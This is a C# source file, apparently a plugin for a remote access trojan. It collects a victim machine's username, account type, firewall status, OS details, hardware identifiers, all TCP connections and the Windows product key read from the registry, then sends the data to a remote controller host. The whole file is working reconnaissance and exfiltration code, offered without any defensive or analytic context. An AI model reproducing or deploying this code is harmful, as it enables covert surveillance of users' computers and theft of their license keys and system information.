using PacketLib;
using PacketLib.Packet;
using PacketLib.Utils;
using System.Collections.Generic;
using System.Threading;

/* 
|| AUTHOR Arsium ||
|| github : https://github.com/arsium       ||
*/

namespace Plugin
{
    public static class Launch
    {
        internal static Dictionary<string, List<string>> cpuInformation;

        static Launch() 
        {
            cpuInformation = new Dictionary<string, List<string>>();
        }

        public static void Main(LoadingAPI loadingAPI)
        {
            switch (loadingAPI.CurrentPacket.PacketType)
            {
                case PacketType.MISC_INFORMATION:
                    cpuInformation.Add("CPU", new List<string>());
                    string s = HardwareInformation.CPUInformation();
                    cpuInformation["CPU"].Add(s);
                    InformationPacket informationPacket = new InformationPacket(cpuInformation, loadingAPI.BaseIp, loadingAPI.HWID);

                    informationPacket.information.systemInformation.systemInformation = new Dictionary<string, string>
                    {
                        { "PC name", Helpers.GetPcName() },
                        { "Username", Helpers.GetUserName() },
                        { "Registered user", Helpers.GetWMIInformation("RegisteredUser") },
                        { "Account type", Helpers.GetUserType().ToString() },
                        { "Firewall", Helpers.GetFirewall() },

                        { "System drive", Helpers.GetWMIInformation("SystemDrive") },
                        { "System path", Helpers.GetWMIInformation("SystemDirectory") },
                        { "OS architecture", Helpers.GetWMIInformation("OSArchitecture") },
                        { "System version", Helpers.GetWMIInformation("Version") },
                        { "OS type", Helpers.GetOsType() },
                        { "OS manufacturer", Helpers.GetWMIInformation("Manufacturer") },
                        { "OS name", Helpers.GetWMIInformation("Caption") },
                        { "OS activation key", ActivationKey.GetWindowsProductKeyFromRegistry() },
                        { "Debug", Helpers.GetDebug() }
                    };

                    informationPacket.information.hardwareInformation.hardwareInformation = new Dictionary<string, string>
                    {
                        { "GPU", Helpers.GetGpuName() },
                        { "Resolution", Helpers.GetResolution() },
                        { "Motherboard", Helpers.GetMainboardName() },
                        { "Bios", Helpers.GetBiosDescription() }
                    };

                    ClientSender(loadingAPI.Host, loadingAPI.Key, informationPacket);
                    break;

                case PacketType.MISC_NETWORK_INFORMATION:
                    NetworkInformationPacket networkInformationPacket = new NetworkInformationPacket(NetworkInformation.AllTCPConnection(), loadingAPI.BaseIp, loadingAPI.HWID);
                    ClientSender(loadingAPI.Host, loadingAPI.Key, networkInformationPacket);
                    break;

                default:
                    return;
            }
            Miscellaneous.CleanMemory();
        }

        private static void ClientSender(Host host, string key, IPacket packet)
        {
            ClientHandler clientHandler = new ClientHandler(host, key);
            clientHandler.ConnectStart();
            while (!clientHandler.Connected)
                Thread.Sleep(125);

            clientHandler.SendPacket(packet);
        }
    }
}
